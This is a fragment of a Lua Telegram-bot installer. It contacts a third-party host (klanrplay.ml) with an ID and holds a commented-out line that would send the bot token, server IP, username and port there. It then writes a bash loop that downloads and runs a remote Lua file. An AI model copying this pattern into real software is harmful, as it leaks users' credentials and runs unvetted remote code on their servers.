...
data,res = https.request("http://klanrplay.ml/hano/hno.php?bn=info&id="..Id)
if res == 200 then
...
--- local t = json:decode(https.request('http://klanrplay.ml/hano/hno.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("HNo", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/HNo
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr HNo.lua
wget "https://raw.githubusercontent.com/hanens/HNo/main/HNo.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./HNo.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
